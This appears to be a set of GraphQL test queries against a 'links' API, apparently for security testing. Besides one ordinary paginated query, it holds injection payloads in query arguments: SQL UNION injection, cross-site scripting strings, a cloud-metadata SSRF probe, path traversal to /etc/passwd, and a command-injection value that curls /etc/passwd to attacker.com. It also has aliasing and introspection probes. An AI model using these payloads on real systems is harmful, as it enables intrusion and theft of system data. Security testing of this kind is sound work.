query.query:
query links {
  links(first: 10, after: "Zm9vOjE1", from: "YmFyOjIw") {
    items {
      id
      type
      description
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query links {
  links(after: "1' UNION SELECT NULL,version()--") {
    items {
      id
      description
    }
  }
}

query links {
  links(from: "<script>alert(document.domain)</script>") {
    items {
      id
      description
    }
  }
}

query links {
  links(after: "http://169.254.169.254/latest/meta-data") {
    items {
      source {
        ... on AccessPoint {
          name
        }
      }
    }
  }
}

query links {
  links(from: "; curl https://attacker.com/?exfil=$(cat /etc/passwd | base64)") {
    items {
      id
    }
  }
}

query links {
  links(after: "../../../../etc/passwd") {
    items {
      body {
        id
      }
    }
  }
}

query links {
  links {
    items {
      annotations(body: "<img src=x onerror=alert(1)>") {
        id
      }
    }
  }
}

query {
  links {
    items {
      id
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  s: links {
    i: items {
      id
      se: systemEvents {
        lm: logMessage
      }
    }
  }
}

query {
  links {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
